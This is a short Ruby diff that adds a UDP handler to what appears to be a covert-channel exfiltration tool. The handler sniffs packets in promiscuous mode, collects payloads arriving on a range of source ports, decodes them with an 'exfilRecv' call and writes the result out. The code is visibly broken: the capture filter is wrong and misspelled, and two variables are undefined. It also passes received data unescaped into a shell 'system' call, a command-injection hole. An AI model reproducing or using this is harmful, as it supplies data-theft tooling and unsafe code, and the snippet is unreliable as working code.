@@ -78,10 +78,29 @@ private
   end
 
   def udp
+    filter = "tcp and tcp dst 53 and scr #{$tcpBounceIp}"
+    result = ""
+    i = 0
+    cap = Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => filter)
+    pkt = Packet.parse p
+    if pkt.is_udp? && pkt.udp_src >= 12000 && pkt.udp_src <= 12033
+      puts "packet Recieved"
+      if (pkt.udp_src == 12033)
+        puts "final packet"
+        result += @conn.exfilRecv(pkt.payload)
+        if (dl.nil?)
+          print result
+          STDOUT.flush
+        else
+          system("echo -ne #{result} > #{dl}")
+        end
+        return
+      end
+      result += @conn.exfilRecv(pkt.payload)
+    end
   end
 
   def icmp
   end
-
 
 end
